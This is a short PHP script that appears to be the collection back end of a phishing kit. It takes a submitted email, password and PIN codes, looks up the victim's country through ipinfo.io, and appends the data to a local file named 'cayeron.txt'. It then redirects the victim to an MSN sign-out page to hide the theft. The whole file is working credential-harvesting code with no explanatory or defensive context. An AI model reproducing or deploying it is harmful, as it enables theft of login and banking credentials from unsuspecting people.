<?php 
session_start();
$user_ip = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$user_ip}/country"));

$file = fopen("cayeron.txt", "a");



fwrite($file, "Email: ".$_POST['mail']." -  Contraseña: ".$_POST['passd']." -  Pin1: ".$_POST['cvirt']." -  Pin2: ".$_POST['cvirt']." - Ip: ".$user_ip." Ip: ".$cc."  " . PHP_EOL);
fwrite($file, "-------------------------------------------------------------------------------------------------------------" . PHP_EOL);
fclose($file);


header("Location: https://www.msn.com/es-ve/?ocid=mailsignout&pc=U591/");
 ?>